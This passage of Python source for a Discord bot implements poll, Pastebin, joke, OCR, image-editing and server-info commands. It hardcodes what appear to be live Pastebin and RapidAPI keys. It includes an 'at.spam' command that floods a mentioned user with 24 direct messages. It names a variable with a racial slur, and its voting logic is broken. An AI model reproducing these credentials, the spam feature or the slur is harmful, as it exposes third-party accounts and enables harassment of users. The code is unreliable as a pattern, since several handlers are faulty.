                await message.channel.edit(name=f"hax hax hax hax")
                time.sleep(.5)
        else: await message.channel.send(f"**{message.author}, You must be an admin to use this feature!**")        
            
            
                
                
    if message.content.startswith("at.poll.setup"):
        if is_admin(int(message.author.id)) == True:
            poll = str(message.content.replace(str(message.content.strip()[0]), ""))
            poll = poll.replace("votesetup", "")
            if len(poll) < 4:
                poll = "voting-poll"
            channel = message.channel.id
            id_string = str(message.channel.id)
            #channel_str = str(message.channel)
            #author = message.author.id
            existing = open("aero-data/existing_polls.txt", "r");check = existing.read();existing.close()
            if id_string in check:
                await message.channel.send(f"**__Error!__ - [Channel: {message.channel}] is already a Voting Poll, talk to Server Owner!**")
            else:
                write = open("aero-data/existing_polls.txt", "a");write.write(f"{id_string}\n");write.close()
                await message.channel.send(f"**{message.author} Successfully Started poll: {poll} in {message.channel}!**")
                await message.channel.edit(name=f"voting-poll--{poll}")
            #
        else:
            await message.channel.send(f"**You are not an Admin, {message.author}!**")


    if message.content.startswith('at.trending_pastes'):
       trends = PastebinAPI.trending(api_dev_key = 'cba0c68b866ae744b9bceabd80a8a2da')
       await message.channel.send(f"```xml\n{trends}\n```")
        
    if message.content.startswith('at.our_pastes'):
        url = "https://pastebin.com/api/api_post.php"
        values = {
          'api_dev_key' : 'cba0c68b866ae744b9bceabd80a8a2da',
          'api_user_key' : '7051ace19d8604a1c3f2f9a4360cee2f',
          'api_results_limit' : '10',
          'api_option' : 'list'
          }
        data = urllib.parse.urlencode(values)
        data = data.encode('utf-8') # data should be bytes
        req = urllib.request.Request(url, data)
        with urllib.request.urlopen(req) as response:
            listed = response.read().decode('utf-8')
            await message.channel.send(f"```xml\n{listed}\n```")
        
        

                                  
    if message.content.startswith('at.pastebin'):
        paste = message.content.replace(f"{message.content.split()[0]} ", "")
        url = "http://pastebin.com/api/api_post.php"
        name = " "
        try:
            name = message.author.name
        except:
            name = str(f'[ID {message.author.id}]')
        values = {
                  'api_dev_key' : 'cba0c68b866ae744b9bceabd80a8a2da', 
                  'api_option' : 'paste',
                  'api_paste_code' : f'{paste}',
                  'api_user_key' : '7051ace19d8604a1c3f2f9a4360cee2f',
                  'api_paste_private' : '0',
                  'api_paste_name' : f'By User: {message.author.id}',
                  'api_paste_expire_date' : 'N',
                  'api_paste_format' : 'text'
                  }
                  #'api_user_key' : 'User Key Here',
        data = urllib.parse.urlencode(values)
        data = data.encode('utf-8') # data should be bytes
        req = urllib.request.Request(url, data)
        with urllib.request.urlopen(req) as response:
            link = response.read().decode('utf-8')
            await message.channel.send(f"""
**Your paste is located at:\n `{link}`**
""")
            
    if message.content.startswith('at.anonpaste'):
        paste = message.content.replace(f"{message.content.split()[0]} ", "")
        url = "http://pastebin.com/api/api_post.php"
        values = {'api_option' : 'paste',
                  'api_dev_key' : 'cba0c68b866ae744b9bceabd80a8a2da',
                  'api_paste_code' : f'{paste}',
                  'api_paste_private' : '0',
                  'api_paste_name' : 'Anon',
                  'api_paste_expire_date' : 'N',
                  'api_paste_format' : 'text'
                  }
                  #'api_user_key' : 'User Key Here',
        data = urllib.parse.urlencode(values)
        data = data.encode('utf-8') # data should be bytes
        req = urllib.request.Request(url, data)
        with urllib.request.urlopen(req) as response:
            link = response.read().decode('utf-8')
            await message.channel.send(f"""
**Your anonymous paste is located at:\n `{link}`**
""")
        
        



    if message.content.startswith('at.joke'):
        cont = True
        try:
            amount = int(message.content.split()[1])
        except:
            cont = False
            await message.channel.send(bold('Correct Usage: at.joke <Amount[1-5]> <Keywords>'))
            
        if amount > 5 or amount < 1:
            await message.channel.send(bold('Correct Usage: at.joke <Amount[1-5]> <Keywords>'))
            cont = False
            
        if cont == True:
            query = message.content.replace(f"{message.content.split()[0]} {message.content.split()[1]} ", "")
            query = query.replace(" ", ",")
            url = "https://webknox-jokes.p.rapidapi.com/jokes/search"
            querystring = {"category":"Chuck Norris","minRating":"5","numJokes":f"{amount}","keywords":f"{query}"}

        headers = {
            'x-rapidapi-host': "webknox-jokes.p.rapidapi.com",
            'x-rapidapi-key': "2b48c2213bmsh67feffc6ea0fda1p19a073jsn79936995dc6a"
            }

        response = requests.request("GET", url, headers=headers, params=querystring)

        await message.channel.send(f"""
```
{response.text}
```

""")
            
    if message.content.startswith("at.voting.add"):
        if is_admin(int(message.author.id)) == True:
            succ = False
            obj = str(message.content.split()[1])
            id_string = str(message.channel.id)
            channel_str = str(message.channel)
            author = message.author.id
            with open("aero-data/existing_polls.txt", "r") as read:
                lines = read.readlines()
                count = 0
                for line in lines:
                    count += 1
                    if id_string in line and obj not in line:
                        lines = str(str(line) + obj+", >0<\n")
                        succ = True
                    else:
                        pass
            if succ == True:
                with open("aero-data/existing_polls.txt", "w") as write:
                    write.writelines(lines)
            else:
                await message.channel.send(f"**__Error__ - Could Not Add `obj` To Poll!**")
            await message.channel.send(f"**{message.author} Successfully Added `{obj}` As A Poll Option!**")
        else:
            await message.channel.send("**You are not an Admin, {message.author}!**")      

    if message.content.startswith("at.vote"):
        t1 = ">";t2 = "<"
        obj = str(message.content.split()[1])
        with open("aero-data/existing_polls.txt", "r") as read:
            str_cat = read.read()
            lines = read.readlines()
            for x, line in enumerate(lines):
                if obj in line:
                    count = int(line.strip(t1)[1].strip(t2)[0])
                    count += 1
                    line_cunt = int(x)
                    strcount = str(count)
                    str_cat[line_cunt] = str(f"{obj}, >{strcount}<\n")
        ok = False            
        with open("aero-data/existing_polls.txt", "w") as write:
            write.writelines(str_cat)
            str_cat = ""
            ok = True
            await message.channel.send(f"**{message.author} Successfully Submitted 1 Vote For `{obj}`!**")
        if ok == False: await message.channel.send("**__Warning:__- Failed To Submit Vote!**")
                
                
                              
    if message.content.startswith("_SDF_SDF_D"):
        #if message.author.id == 325426360510054401 or message.author.id == 556929489850990618:
        #    sux1 = False
        #    try:
        #        idd = str(int(message.content.split()[1].replace("<", "").replace("@", "").replace(">", "").replace("!", "")))
        #        sux1 = True
        #    except Exception:
        #        await message.channel.send('Incorrect Usage: at.add.admin @VALID_MENTION')
        #        sux1 = False
        #    if sux1 == True:
        #        try:
        #            with open("aero_admins.txt", "a") as admin:
        #                admin.write(f"\n{idd}")
        #                sux1 = True
        #        except Exception as fdsf:
        #            sux1 = False
        #            log(str(fdsf))        
        #    if sux1 == True:
        #        await message.channel.send(bold(f'Successfully Added <@{idd}> To Aeros Private Admin Database!'))
        #    else:
        #        await message.channel.send(bold(f'__Server-Side Error:__ Failed To Add <@{idd}> To Database!'))
        
        #STARTs PUBLIC HERE
        continue_ = True
        if message.author == message.guild.owner:
            try:
                idd = int(message.content.split()[1].replace("<", "").replace("@", "").replace(">", "").replace("!", ""))
            except Exception:
                await message.channel.send(bold('Incorrect Usage: at.add.admin @VALID_MENTION'))
                continue_ = False
            if continue_ != False:
                try:
                    add_admin_public(message.author.id, idd, message.guild.id, message.guild.owner.id)
                    continue_ = True
                except Exception as fdsf:
                    log.log(str(fdsf))
                    continue_ = False
                if continue_ == True:
                    return_ = f"Successfully Added <@{idd}> To {message.guild.name}'s Admin Database!"    
                else:
                    return_ = f"__Server-Side Error:__ Failed To add <@{idd}> To {message.guild.name}'s Admin Database!\nUse 'at.ticket <Your Message>' To Contact Dev!"
                await message.channel.send(bold(return_))
        else:
            await message.channel.send('**You Must Be Guild Owner To Add Admins!!!**')







                
            
    if message.content.startswith("at.uptime") or message.content.startswith("at.system"):
        try:
            uptime = subprocess.check_output("uptime")
            uptime1 = uptime.decode("utf-8")
            up = uptime1.replace(",", " |")
        except Exception:
            up = "Oops! I'm running on a Windows test machine!"
        embed = discord.Embed(title=f"AeroTools Version-X Uptime", description=" ", url='https://aero-bot.pro/', color=0x8000ff)
        embed.set_author(name="AeroTools Version-X", url='https://aero-bot.pro/', icon_url='https://cdn.discordapp.com/attachments/610035652112810024/629528197402198062/python3-centos.png')###CENTOS7 IMG
        embed.set_thumbnail(url="https://media.discordapp.net/attachments/610035652112810024/620167625774727178/1_h4YRd-tMvBGSVhAXtzYbKA_1.png")##UPTIME IMG
        embed.add_field(name="__System Uptime:__", value=f"{up}", inline=False)
        embed.add_field(name="__Cached Messages:__", value=str(count), inline=False)
        #embed.add_field(name="__Self Bots Detected:__", value=str(bot_count), inline=False)
        embed.add_field(name="__Active Shards:__", value="`0`", inline=False)
        embed.add_field(name="__System:__", value=str(platform.system()), inline=False)
        embed.add_field(name="__Node:__", value=str(str(platform.node().replace("259884", "xxxxxx"))), inline=False)
        embed.add_field(name="__Release:__", value=str(platform.release()), inline=False)
        embed.add_field(name="__Version:__", value=str(platform.version()), inline=False)
        embed.add_field(name="__Machine:__", value=str(platform.machine()), inline=False)
        embed.add_field(name="__Proccessor:__", value=str(platform.processor()), inline=False)
        embed.set_footer(text=f"Requested By {message.author} in #{message.channel}.")
        await message.channel.send("**__System Info__**", embed=embed)
        
    if message.content.startswith("at.math") or message.content.startswith("at.calculator"):
        fuck = message.content.split()
        eroz = False
        try:
            var1 = int(fuck[1])
            sign = fuck[2]
            var2 = str(fuck[3])
        except Exception:
            eroz = True
        if eroz == False:
            try:
                if sign == "+":
                    answer = int(int(var1) + int(var2))
                    await message.channel.send(f"```css\n{str(answer)}\n```")
                if sign == "-":
                    answer = int(int(var1) - int(var2))
                    await message.channel.send(f"```css\n{str(answer)}\n```")
                if sign == "*":
                    answer = int(int(var1) * int(var2))
                    await message.channel.send(f"```css\n{str(answer)}\n```")
                if sign == "/":
                    answer = int(int(var1) / int(var2))
                    await message.channel.send(f"```css\n{str(answer)}\n```")
            except Exception as g:
                await message.channel.send(f"```css\n{str(g)}\n```")
        else:
            await message.channel.send("Incorrect Usage!\nTry: `at.math 6 * 6 or at.math 6 / 6 or at.math 6 + 6 or at.math 6 - 6`")
        
    if message.content.startswith('at.smart_phrase'):
        with requests.get("https://corporatebs-generator.sameerkumar.website/") as api:
            re = str(api.json()['phrase'])
        await message.channel.send(f"""
**__Intelligent Phrase Generator__**
**Phrase:**
```
{re}
```
""")

    if message.content.startswith('at.server.info'):
        name = str(message.guild.name)
        idd = str(message.guild.id)
        icon = str(message.guild.icon_url)
        owner = str(message.guild.owner)
        owner_id = str(message.guild.owner_id)
        region = str(message.guild.region)
        description = str(message.guild.description)
        features = str(message.guild.features)
        boosts = str(message.guild.premium_subscription_count)
        members = str(message.guild.member_count)
        date = str(message.guild.created_at)
        day = str(date.split(" ")[0])
        time = str(date.split(" ")[1])
        text_channels = str(len(message.guild.text_channels))
        voice_channels = str(len(message.guild.voice_channels))
        #catagories = str(len(message.guild.catagories))
        embed = discord.Embed(title=f"Server Info: ", description=f'{name}', url='https://aero-bot.pro/', color=0x8000ff)
        embed.set_author(name="AeroTools Version-X", url='https://aero-bot.pro/', icon_url='https://cdn.discordapp.com/attachments/610035652112810024/614966581499265026/aero.png')
        embed.set_thumbnail(url=icon)
        embed.add_field(name="__Server:__", value=f"{name} | {idd}", inline=True)
        embed.add_field(name="__Owner:__", value=f"{owner} | {owner_id}", inline=True)
        embed.add_field(name="\n------------------------------------------------------------------------------", value="------------------------------------------------------------------------------\n", inline=True)
        embed.add_field(name="__Members:__", value=members, inline=True)
        embed.add_field(name="__Created:__", value=day, inline=True)
        embed.add_field(name="__Region:__", value=region, inline=True)
        embed.add_field(name="__Boosts:__", value=boosts, inline=True)
        embed.add_field(name="__Text Channels:__", value=text_channels, inline=True)
        embed.add_field(name="__Voice Channels:__", value=voice_channels, inline=True)
        #embed.add_field(name="__Catagories:__", value=catagories, inline=True)
        embed.add_field(name="__Description:__", value=description, inline=True)
        embed.add_field(name="__Features:__", value=f"```css\n{features}\n```", inline=True)
        embed.set_footer(text=f"Requested By {message.author} in #{message.channel}.")
        await message.channel.send("**__Server Info__**", embed=embed)
        






            
            
    if message.content.startswith('at.announce'):
        if message.author.id == 632636197784649758:
            channel = client.get_channel(int(message.content.split()[1])) 
            content = message.content.replace("at.announce", "").replace(message.content.split()[1], "").replace("  ", "")
            await channel.send(content)
            await message.channel.send(f'** {message.author}, Your announcement has been posted! | Channel: <#619225734187057186> **')
            await message.delete()
            
    if message.content.startswith('at.check.date') or message.content.startswith('at.id.date'):
        try:
            berr = False
            p = int(message.content.split()[1])
            pstr = str(p)
            create_date = str(discord.utils.snowflake_time(int(p)))
        except Exception as er:
            berr = True
            log.log(str(er))
        if berr == False:
            await message.channel.send(f"**This Profile, Message, DM, Server or OTHER, `[{pstr}]` Was Created** `[{create_date}]`")
        
                    
        
    if message.content.startswith('at.ticket') or message.content.startswith('$ticket'):
        op = str(message.author)
        await message.channel.send(ticket.make(message.content, op))
        await message.delete()
        me = client.get_user(632636197784649758)
        nig = str(message.author);ran=str(randint(1000, 9999));content = str(message.content.replace("at.ticket",''));t_d=str(datetime.now())
        stuff = str(f"```css\n[{t_d}] - [__**TICKET**__: {ran}]\nTicket From:\n {nig} | {message.author.id}\nIn Server:\n {message.guild.name} | {message.guild.id}\nChannel:\n {message.channel.name} | {message.channel.id}\n\n------------------------\nBODY:\n{content}\n----------------------------\n```\n")
        await me.send(stuff)

    if message.content.startswith("at.spam"):
        try:
            str_target = int(message.content.split()[1].replace("<", "").replace("@", "").replace(">", "").replace("!", ""))
            exx = False
        except Exception:
            await message.channel.send(str(bold("Error - Needs To Be: "))+str(css("at.spam @valid_user_mention")))
        target = int(str_target)
        worked = True
        if exx == False:
            if blacklist.check(target) == False:
                user = client.get_user(target)
                if user is not None and user.bot != True:
                    count = 0
                    try:
                        await message.channel.send("https://cdn.discordapp.com/attachments/610035652112810024/631027542660481024/brace-yourself-here-yhpcqu.jpg")
                        async with message.channel.typing():
                            for x in range(0, 24):
                                count += 1
                                await user.send(f"**Hey <@{str(user.id)}> !\n{message.author} Asked Me To Send You A Message Or Two!\n[Message Count: {str(count)}]**\nhttps://cdn.discordapp.com/attachments/608758890104094725/630290069672165397/AeroTools_Suprise.gif")                           
                            await message.channel.send(f"**<@{message.author.id}> Successfully Sent `{count}` Messages Of Spam To <@{str(user.id)}>!!!**")    
                    except Exception as poop:
                        worked = False
                        #await message.channel.send(f"**__Warning:__ - Could Not Send Spam To {member.name}!\n```css\n{str(poop)}\n```**")
            else:
                await message.channel.send(f"**__Blacklisted:__ - Member on Blacklist By Request!\nUse `at.is.blacklist <@user> or at.addme.blacklist` to opt out of Spam Warz!**")
        else:
            await message.channel.send(f"**__Warning:__ - Could Not Find Member In Our Server!**")


    if message.content.startswith("at.x.x.x..xx...xx"):
        cont_ = True
        try:
            url = str(message.content.split()[1])
        except:
            cont_ = False
            await message.channel.send("**You must provide a URL!**")

        my_file = utils.youtube_to_mp3(url)
        print(my_file)    
        if my_file is not None:
            await message.channel.send(f"<@{message.author.id}>, **Here's your MP3 from: ||`{url}`||**", file=discord.File(my_file))
            os.remove(my_file)
        else:
            await message.channel.send(f"<@{message.author.id}>, **Failed to download your MP3 from: ||`{url}`||**")

                    

    if message.content.startswith("at.dxdfdkkksddksd"):
        cont_ = True
        try:
            url = str(message.content.split()[1])
        except:
            cont_ = False
            await message.channel.send("**You must provide a URL!**")
        if cont_ == True:
            async with message.channel.typing():
                try:
                    my_file = utils.youtube_video(url)
                except Exception as EE:
                    log.log(str(EE))
                    await message.channel.send(str(EE))
                    cont_ = False
                    my_file = None

            if my_file is not None:
                await message.channel.send(
                    f"<@{message.author.id}>, **Here's your download from: ||`{url}`||**",
                    file=discord.File(my_file))
                os.remove(my_file)
            else:
                await message.channel.send(f"<@{message.author.id}>, **Failed to download video file from: ||`{url}`||**") 


    if message.content.startswith("at.readme"):
        cont = True
        try:
            fname = utils.download_image(message.content.split()[1])
        except:
            cont = False
            await message.channel.send(
                "**__Correct Usage:__ `at.readme <URL To Valid Image>`**\n"
                "*__Hint__ Use `at.pfp @USER` then use the link from there to use a user's avatar!*"
                )    
 
        if cont == True:
            try:
                text = pytesseract.image_to_string(Image.open(fname), lang='eng')
            except:
                await message.channel.send(
                    "**__Correct Usage:__ `at.readme <URL To Valid Image>`**\n"
                    "*__Hint__ Use `at.pfp @USER` then use the link from there to use a user's avatar!*"
                    )
                cont = False

            if cont == True:
                try:
                    filename = make_mp3_2(text)
                except:
                    await message.channel.send(
                        "**Whoah! I Couldnt Find Anything! {message.author.mention}**"
                        )
                    cont = False
                    
                if cont == True:
                    try:
                        await message.channel.send(
                            f"**Image-To-Speech for {message.author.mention}:**",
                            file=discord.File(filename))
                    except:
                        await message.channel.send(
                            f"**Whoah! I Couldnt Find Anything! {message.author.mention}**"
                            )                        
                    
                    


    if message.content.startswith("at.img2text"):
        cont = True
        try:
            fname = utils.download_image(message.content.split()[1])
        except:
            cont = False
            await message.channel.send(
                "**__Correct Usage:__ `at.img2text <URL To Valid Image>`**\n"
                )    
 
        if cont == True:
            try:
                text = pytesseract.image_to_string(Image.open(fname), lang='eng')
            except:
                await message.channel.send(
                    "**__Correct Usage:__ `at.img2text <URL To Valid Image>`**\n"
                    )
                cont = False

            if cont == True:
                try:

                    await message.channel.send(f'''
                    ```css
                    {text}
                    ```
                    ''')
                except:
                    with open(f"{fname}.txt","w+") as save:
                        save.write(text)    
                    await message.channel.send(
                        "**Whoah! I found so much text that I can't send it across Discord so here's a text file!**",
                         file=discord.File(f"{fname}.txt"))
                    remove(fname)

    if message.content.startswith("at.img2data"):
        cont = True
        try:
            fname = utils.download_image(message.content.split()[1])
        except:
            cont = False
            await message.channel.send("**__Correct Usage:__ `at.img2data <URL To Valid Image>`**\n"
                "*__Hint__ Use `at.pfp @USER` then use the link from there to use a user's avatar!*")    
 
        if cont == True:
            try:
                text = pytesseract.image_to_string(Image.open(fname), lang='eng')
            except Exception as ee:
                await message.channel.send(f"**__OCR::Fatal Error:__**\n```css\n{str(ee)}\n```")
                cont = False

            if cont == True:
                try:
                    await message.channel.send(f'''**__Text Found:__**\n```css\n{text}\n```''')
                    sleep(.1)
                except:
                    with open(f"{fname}.txt","w+") as save:
                        save.write(text)    
                    await message.channel.send(
                        "**Whoah! I found so much text that I can't send it across Discord so here's a text file!**",
                         file=discord.File(f"{fname}.txt"))
                    remove(f"{fname}.txt")
                        
                try:
                    verbose = pytesseract.image_to_data(Image.open(fname))
                    try:
                        await message.channel.send(f'''**__Verbose Info:__**\n```css\n{verbose}\n```''')
                    except:
                        with open(f"{fname}_verbose_data.dat","w+") as save:
                            save.write(verbose)    
                        await message.channel.send(
                            "**Whoah! I found so much Verbose Data that I can't send it across Discord so here's a dat file!**",
                             file=discord.File(f"{fname}_verbose_data.dat"))
                        remove(f"{fname}_verbose_data.dat")
                    sleep(.1)
                except Exception as ef:
                    await message.channel.send(f"**__VerboseInfo::Fatal Error:__**```\ncss\n{ef}\n```")
                    
                try:
                    boxes = pytesseract.image_to_boxes(Image.open(fname))
                    try:
                        await message.channel.send(f'''**__Box Detection:__**\n```css\n{boxes}\n```''')
                    except:
                        with open(f"{fname}_bounding_box_data.dat","w+") as save:
                            save.write(boxes)    
                        await message.channel.send(
                            "**Whoah! I found so much Bounding Box Data that I can't send it across Discord so here's a dat file!**",
                             file=discord.File(f"{fname}_bounding_box_data.dat"))
                        remove(f"{fname}_bounding_box_data.dat")                        
                    sleep(.1)
                except Exception as eg:
                    await message.channel.send(f"**__BoxDetection::Fatal Error:__**```\ncss\n{eg}\n```")

                try:
                    osd =  pytesseract.image_to_osd(Image.open(fname))
                    try:
                        await message.channel.send(f'''**__OSD/Script Detection:__**\n```css\n{osd}\n```''')
                    except:
                        with open(f"{fname}_osd.dat","w+") as save:
                            save.write(osd)    
                        await message.channel.send(
                            "**Whoah! I found so much OSD Info that I can't send it across Discord so here's a dat file!**",
                             file=discord.File(f"{fname}_osd.dat"))
                        remove(f"{fname}_bounding_osd.dat")                               
                    sleep(.1)
                except Exception as eh:
                    await message.channel.send(f"**__OSD & ScriptDetection::Fatal Error:__**```\ncss\n{eh}\n```")
                    
                remove(fname)    
                    

    if message.content.startswith('at.is.blacklist'):
        try:
            if blacklist.check(str(message.content.split()[1].replace("<", "").replace("@", "").replace(">", "").replace("!", ""))) == True: await message.channel.send(bold("User Is In Blacklist!"))
            else: await message.channel.send(bold("User Not Found In Blacklist!"))
        except Exception as fdgdf:
            await message.channel.send(bold("__Correct Usage:__ 'at.is.blacklist @USER'"))
            log.log(str(fdgdf))

    if message.content.startswith('at.addme.blacklist'):
        if blacklist.check(str(message.author.id)) == True: await message.channel.send(bold("User Is Already In Blacklist!"))
        else:
            blacklist.add(str(message.author.id))       
            await message.channel.send(bold(f"[{message.author} |{message.author.id} ] Has Successfully Been Added To Blacklist!"))
        
    if message.content.startswith('at.text'):
        stuff = message.content.replace("at.text ","")
        if len(stuff) > 2:
            if len(stuff) < 24:
                async with message.channel.typing():
                    cont = True
                    try:
                        fname = str(randint(1111, 9999))
                        fname = str("aero-data/img/"+fname+".png")
                        img = Image.new('RGB', (int(40 + (round(len(stuff) * 128)) / 15), 30), color = (44, 47, 51))# 'RGB', (100, 30), color = 
                        fnt = ImageFont.truetype(str("aero-data/fonts/"+str(get_random_font())), 15)
                        d = ImageDraw.Draw(img)
                        d.text((10,10), stuff, font=fnt, fill=(randint(10, 245),randint(10, 245),randint(10, 245)))
                        img.save(fname)
                    except Exception as eeds:
                        log.log(str(eeds))
                        
                        try:
                            fname = str(randint(1111, 9999))
                            fname = str("aero-data/img/"+fname+".png")
                            img = Image.new('RGB', (int(40 + (round(len(stuff) * 128)) / 15), 30), color = (44, 47, 51))# 'RGB', (100, 30), color = 
                            fnt = ImageFont.truetype(str("aero-data/fonts/"+str(get_random_font())), 15)
                            d = ImageDraw.Draw(img)
                            d.text((10,10), stuff, font=fnt, fill=(randint(10, 245),randint(10, 245),randint(10, 245)))
                            img.save(fname)
                        except Exception as eeeds:
                            log.log(str(eeeds))
                            cont = False
                            
                    if cont == True:
                        await message.channel.send(f"**Here's Your Banner <@{message.author.id}>!**", file=discord.File(fname))
                        remove(fname)
                    else:
                        await message.channel.send(f"**Failed To Create Banner <@{message.author.id}>!\n> Invalid Character/s?**")
                        try:
                            remove(fname)
                        except Exception: pass
                            
                            
            else:
                await message.channel.send(bold("Max Characters: 24!"))
        else:
            await message.channel.send(bold("Not Enough Characters To Make A Banner! (Min: 2)"))


    if message.content.startswith('at.pfp'):
        pp1 = message.content.replace("at.pfp","").replace(" ", "").replace("<", "").replace("@", "").replace(">", "").replace("!", "")
        expx = False
        try:
            pp1 = int(pp1)
        except Exception:
            expx = True
            pass
        if expx == False:
            async with message.channel.typing():
                member = discord.utils.get(message.guild.members, id=pp1)
                if member is not None and member.bot != True:
                    try:
                        await message.channel.send(str(member.avatar_url))
                    except Exception:
                        await message.channel.send(bold("Couldn't Find An Avatar For This Member!"))
                else:
                    await message.channel.send(bold("Couldn't Find This Member!"))

    if message.content.startswith('at.brand'):
        pyyp1 = message.content.replace("at.brand","").replace(" ", "").replace("<", "").replace("@", "").replace(">", "").replace("!", "")
        exp = False
        try:
            pyyp1 = int(pyyp1)
        except Exception:
            exp = True
            pass
        if exp == False:
            member = discord.utils.get(message.guild.members, id=pyyp1)
            if member is not None:
                cont = True
                try:
                    fname1 = utils.download_image(str(member.avatar_url))
                except Exception as tell:
                    log.log(str(tell))
                    cont = False
                    await message.channel.send(bold("Couldn't Get An Avatar For This Member!\n> Valid User?\n> Is GIF?"))
                if cont == True:
                    try:
                        async with message.channel.typing():
                            source_img = Image.open(fname1).convert("RGBA")
                            draw = ImageDraw.Draw(source_img)
                            #draw.rectangle(((0, 00), (100, 100)), fill="black")
                            draw.text((50, 50), "AeroTools Version-X", font=ImageFont.truetype(f"aero-data/fonts/"+str(get_random_font()), 30))
                            source_img.save(fname1, "PNG")
                    except Exception as eeds:
                        log.log(str(eeds))
                        cont = False
                    if cont == True:
                        await message.channel.send(f"**Here's Your Image <@{message.author.id}>!**", file=discord.File(fname1))
                        remove(fname1)
                    else:
                        await message.channel.send(f'**Oof!!! I had an error! Wanna see? ;)\n**```python\n{str(eeds)}```\n')
                        
            else:
                await message.channel.send(bold("Couldn't Find This Member!"))


    if message.content.startswith('at.cartoonify'):
        pyyp1 = message.content.replace("at.cartoonify","").replace(" ", "").replace("<", "").replace("@", "").replace(">", "").replace("!", "")
        exp = False
        try:
            pyyp1 = int(pyyp1)
        except Exception:
            exp = True
            pass
        if exp == False:
            member = discord.utils.get(message.guild.members, id=pyyp1)
            if member is not None:
                cont = True
                try:
                    fname = utils.download_image(str(member.avatar_url))
                except Exception as eee:
                    cont = False
                    print(str(eee))
                    await message.channel.send(bold("Couldn't Get An Avatar For This Member!\n> Valid User?\n> Is GIF?"))
                try:
                    async with message.channel.typing():
                        img = Image.open(fname)
                        km = (-2, -1,  0, -1,  1,  1, 0,  1,  2)
                        k = ImageFilter.Kernel(size=(3, 3), kernel=km,
                            scale=sum(km),  # default
                            offset=0  # default
                            )
                        img.filter(k).save(fname)
                except Exception as eeds:
                    log.log(str(eeds))
                    cont = False
                if cont == True:
                    await message.channel.send(f"**Here's Your Image <@{message.author.id}>!**", file=discord.File(fname))
                    remove(fname)
                else:
                    remove(fname)
                    await message.channel.send("**```diff\n-Error!\nCould Not Process Image! GIF mabye?\n```**")
            else:
                await message.channel.send(bold("Couldn't Find This Member!"))

    if message.content.startswith('at.emojify'):
        pyyp1 = message.content.replace("at.emojify","").replace(" ", "").replace("<", "").replace("@", "").replace(">", "").replace("!", "")
        exp = False
        try:
            pyyp1 = int(pyyp1)
        except Exception:
            exp = True
            pass
        if exp == False:
            member = discord.utils.get(message.guild.members, id=pyyp1)
            if member is not None:
                conti = True
                try:
                    fname = utils.download_image(str(member.avatar_url))
                except Exception:
                    conti = False
                    await message.channel.send(bold("Couldn't Get An Avatar For This Member!"))
                if conti == True:
                    try:
                        async with message.channel.typing():
                            for infile in glob.glob(fname):
                                file, ext = os.path.splitext(infile)
                                im = Image.open(infile)
                                im.thumbnail(128, 128)
                                im.save(fname, "PNG")
                    except Exception as dore:
                        log.log(str(dore))
                        conti = False
                        
                    if conti == True:
                        await message.channel.send(f"**Here's Your Emoji <@{message.author.id}>!**", file=discord.File(fname))
                        remove(fname)
                    else:
                        remove(fname)
                        await message.channel.send("**```diff\n-Error!\nCould Not Process Image!\n```**")


    if message.content.startswith('at.custom_overlay'):
        link = False
        continue_ = True
        exp = False
        user_id = ""
        if len(message.content.split()) == 3:
            if len(message.content) > 8:
                try:
                    if "http" in message.content.split()[1]:
                        fname1 = utils.download_image(message.content.split()[1])
                        link = True
                    else:
                        try:
                            user_id = int(str(message.content.split()[1].replace("<", "").replace("@", "").replace(">", "").replace("!", "")))
                            member = discord.utils.get(message.guild.members, id=user_id)
                            fname1 = utils.download_image(str(member.avatar_url))
                        except Exception as ee:
                            log.log(str(ee))
                            await message.channel.send(bold(f"Couldn't find Member: `<@{user_id}>`"))

                    if "http" in message.content.split()[2]:
                        fname2 = utils.download_image(message.content.split()[2])
                        link = True
                    else:
                        try:
                            user_id = int(str(message.content.split()[2].replace("<", "").replace("@", "").replace(">", "").replace("!", "")))
                            member = discord.utils.get(message.guild.members, id=user_id)
                            fname2 = utils.download_image(str(member.avatar_url))
                        except Exception as ee:
                            log.log(str(ee))
                            await message.channel.send(bold(f"Couldn't find Member: `<@{user_id}>`"))
                                                
                except Exception as dfds:
                    continue_ = False
                    log.log(str(dfds))
                    exp = True
                    await message.channel.send(bold(f"""
    __Incorrect!__ - Use `at.custom_overlay <Any Link or @User> <Any Link or @User>`\nFormatting: `at.custom_overlay <Semi-Transparent/PNG> <ANY>`
    """))


                
                
            #if overlay in overlays:
            #    pass
            #else:
            #    await message.channel.send(bold(f"Couldn't find overlay: `{overlay}`"))

            if continue_ == True:
                try:
                    async with message.channel.typing():
                        #
                        #
                        size = (512, 512)
                        
                        img = Image.open(fname1)
                        img = img.resize(size,Image.ANTIALIAS)

                        background = Image.open(fname2)

                        background = background.resize(size,Image.ANTIALIAS)
                        
                        background.paste(img, (0, 0), img)
                        
                        nu_name = "aero-data/img/"+str(randint(1111, 9999))+".png"
                        
                        background.save(nu_name,"PNG")
                        
                        #
                        #
                        #
                        
                except Exception as dore:
                    log.log(str(dore))
                    continue_ = False
                    
                if continue_ == True:
                    await message.channel.send(f"**Here's Your Image <@{message.author.id}>!**", file=discord.File(nu_name))
                    remove(nu_name)
                else:
                    await message.channel.send("**```diff\n-Error!\nCould Not Process Image! Image 1 Must Be Semi-Transparent/PNG!\n```**")
                            
        else:
            await message.channel.send(bold(f"""
    __Incorrect!__ - Use `at.custom_overlay <Any Link or @User> <Any Link or @User>`.
    """))
              



                
    if message.content.startswith('at.overlay'):
        link = False
        continue_ = True
        exp = False
        user_id = ""
        if len(message.content) > 8:                
            try:
                overlay = message.content.split()[1]
                if "http" in message.content.split()[2]:
                    fname = utils.download_image(message.content.split()[2])
                    link = True
                else:
                    try:
                        user_id = int(str(message.content.split()[2].replace("<", "").replace("@", "").replace(">", "").replace("!", "")))
                        member = discord.utils.get(message.guild.members, id=user_id)
                        fname = utils.download_image(str(member.avatar_url))
                    except Exception as ee:
                        log.log(str(ee))
                        await message.channel.send(bold(f"Couldn't find Member: `<@{user_id}>`"))
                        
            except Exception as dfds:
                continue_ = False
                log.log(str(dfds))
                exp = True
                await message.channel.send(bold(f"""
__Incorrect!__ - Use `at.overlay <Overlay> <@user or Img Link>`.
"""))
                
            #if overlay in overlays:
            #    pass
            #else:
            #    await message.channel.send(bold(f"Couldn't find overlay: `{overlay}`"))

            if continue_ == True:
                try:
                    overlay = f"aero-data/img/overlays/{overlay}.png"
                    async with message.channel.typing():
                        #
                        #
                        size = (512, 512)
                        
                        img = Image.open(overlay)
                        img = img.resize(size,Image.ANTIALIAS)

                        background = Image.open(fname)

                        
                        background = background.resize(size,Image.ANTIALIAS)
                        
                        background.paste(img, (0, 0), img)
                        background.save(fname,"PNG")
                        #
                        #
                        #
                        
                except Exception as dore:
